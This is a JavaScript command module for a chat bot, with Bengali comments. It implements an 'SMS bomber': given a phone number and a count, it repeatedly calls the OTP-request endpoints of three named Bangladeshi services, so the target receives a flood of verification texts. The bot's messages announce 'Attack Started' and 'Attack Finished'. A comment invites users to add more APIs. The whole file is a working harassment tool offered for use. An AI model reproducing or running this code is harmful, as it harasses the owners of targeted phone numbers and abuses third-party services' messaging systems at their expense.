const fetch = require("node-fetch");

module.exports.config = {
    name: "bomb",
    version: "1.0.0",
    permission: 0,
    credits: "Gift Bomber",
    description: "SMS Bomber Tool",
    commandCategory: "utility",
    usages: ".bomb <number> <amount>",
    cooldowns: 5
};

module.exports.run = async function({ api, event, args }) {
    const number = args[0];
    const amount = parseInt(args[1]);

    if (!number || !amount) {
        return api.sendMessage("⚠️ ব্যবহার: .bomb <number> <amount>", event.threadID, event.messageID);
    }

    // ডিজাইন শুরু
    api.sendMessage(
`━━━━━━━━━━━━━━━━━━
🎁 𝐆𝐈𝐅𝐓 𝐁𝐎𝐌𝐁𝐄𝐑 🎁
━━━━━━━━━━━━━━━━━━
📱 Target: ${number}
🔢 Amount: ${amount}
━━━━━━━━━━━━━━━━━━
🚀 Attack Started...
━━━━━━━━━━━━━━━━━━`,
    event.threadID);

    // API List
    const apis = [
        {
            url: "https://bkshopthc.grameenphone.com/api/v1/fwa/request-for-otp",
            method: "POST",
            headers: { "content-type": "application/json", "user-agent": "Mozilla/5.0" },
            body: (num) => JSON.stringify({ phone: num, email: "", language: "en" })
        },
        {
            url: "https://ss.binge.buzz/otp/send/login",
            method: "POST",
            headers: { "content-type": "application/x-www-form-urlencoded" },
            body: (num) => `phone=${num}`
        },
        {
            url: `https://www.shwapno.com/WebAPI/CRMActivation/Validate?Channel=W&otpCRMrequired=false&otpeCOMrequired=true&smssndcnt=8&otpBasedLogin=false&MobileNO=88${number}&countryPhoneCode=%2B88`,
            method: "GET",
            headers: { "user-agent": "Mozilla/5.0" },
            body: null
        }
        // চাইলে আরো API যোগ করতে পারো
    ];

    // Loop
    for (let i = 0; i < amount; i++) {
        for (let apiData of apis) {
            try {
                await fetch(apiData.url, {
                    method: apiData.method,
                    headers: apiData.headers,
                    body: apiData.body ? apiData.body(number) : null
                });
            } catch (e) {
                console.log("Error:", e.message);
            }
        }
    }

    // ডিজাইন End
    api.sendMessage(
`━━━━━━━━━━━━━━━━━━
✅ Attack Finished!
📱 Target: ${number}
🔢 Total: ${amount}x
━━━━━━━━━━━━━━━━━━
👑 𝐑𝐀𝐇𝐀𝐃 𝐁𝐎𝐒𝐒 👑
━━━━━━━━━━━━━━━━━━`,
    event.threadID);
};
